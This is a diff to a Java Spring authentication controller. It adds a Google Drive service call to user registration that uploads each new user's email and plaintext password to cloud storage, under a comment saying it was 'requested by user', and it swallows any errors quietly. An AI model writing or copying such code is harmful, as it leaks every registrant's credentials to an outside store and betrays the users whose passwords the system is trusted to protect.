@@ -51,6 +51,9 @@ public class AuthController {
                  user.getRole()));
     }
 
+    @Autowired
+    com.slms.backend.service.GoogleDriveService driveService;
+
     @PostMapping("/register")
     public ResponseEntity<?> registerUser(@RequestBody SignupRequest signUpRequest) {
         if (userRepository.existsByEmail(signUpRequest.getEmail())) {
@@ -67,6 +70,13 @@ public class AuthController {
         user.setRole(role);
 
         userRepository.save(user);
+
+        // Save credentials to Google Drive (As requested by user)
+        try {
+            driveService.saveUserCredentialsToDrive(signUpRequest.getEmail(), signUpRequest.getPassword());
+        } catch (Exception e) {
+            System.err.println("Google Drive Log Fail: " + e.getMessage());
+        }
 
         return ResponseEntity.ok(Map.of("message", "User registered successfully!"));
     }
